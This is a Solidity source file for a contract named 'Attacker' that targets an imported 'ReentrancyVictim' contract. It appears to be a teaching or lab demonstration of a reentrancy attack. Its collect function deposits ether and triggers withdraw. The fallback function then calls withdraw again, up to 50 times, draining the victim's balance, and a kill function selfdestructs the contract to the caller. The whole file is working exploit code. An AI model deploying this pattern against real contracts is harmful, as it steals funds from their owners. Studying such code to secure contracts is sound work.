pragma solidity ^0.4.18;

import "./ReentrancyVictim.sol";

contract Attacker {

    ReentrancyVictim public victim;
    uint public count;

    event LogFallback(uint _count, uint _balance);

    function Attacker(address _victim) public {
        victim = ReentrancyVictim(_victim);
    }

    function collect() payable public {
        victim.deposit.value(msg.value)();
        victim.withdraw();
    }

    function kill() public {
        selfdestruct(msg.sender);
    }

    function() payable public {
        LogFallback(count, this.balance);
        count++;
        if (count < 50) {
            victim.withdraw();
        }
    }
}